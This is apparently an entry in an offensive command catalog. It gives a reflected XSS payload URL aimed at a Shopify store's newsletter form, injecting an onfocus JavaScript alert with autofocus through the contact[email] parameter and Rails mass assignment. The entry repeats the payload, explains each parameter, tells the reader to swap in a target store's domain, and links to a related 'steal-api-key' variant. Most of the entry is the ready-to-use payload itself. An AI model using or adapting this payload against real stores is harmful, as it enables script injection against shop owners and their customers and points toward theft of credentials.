---
id: cmd-uuid-1
data: >-
  https://testbuguser.myshopify.com/?contact[email]%20onfocus%3djavascript:alert(%27xss%27)%20autofocus%20a=a&form_type[a]aaa
tags:
  - xss
  - shopify
type: command
output: Alert box with 'xss'
executor: browser
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:06.629Z'
verified: false
validated: true
submitted: true
---
# shopify-newsletter-xss-alert

## Command

```bash
https://testbuguser.myshopify.com/?contact[email]%20onfocus%3djavascript:alert(%27xss%27)%20autofocus%20a=a&form_type[a]aaa
```

## Description

This URL command demonstrates a basic reflective XSS in Shopify's newsletter form by injecting an onfocus JavaScript alert via the contact[email] parameter, using mass assignment to add attributes.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| contact[email] | Encoded payload for attribute injection | Yes |
| form_type[a] | Facilitates Rails mass assignment | Yes |
| onfocus=javascript:alert('xss') | JS payload to execute | Yes |
| autofocus | Triggers execution on load | Yes |

## Examples

### Basic Usage

```bash
https://testbuguser.myshopify.com/?contact[email]%20onfocus%3djavascript:alert(%27xss%27)%20autofocus%20a=a&form_type[a]aaa
```

### Advanced Usage

Replace domain with target store and customize alert message.

## Expected Output

Browser alert popup displaying 'xss' upon page load, confirming vulnerability.

## Related

- [[commands/shopify-newsletter-xss-steal-api-key]]
- [[procedures/Identify-Reflective-XSS-in-Newsletter-Form]]
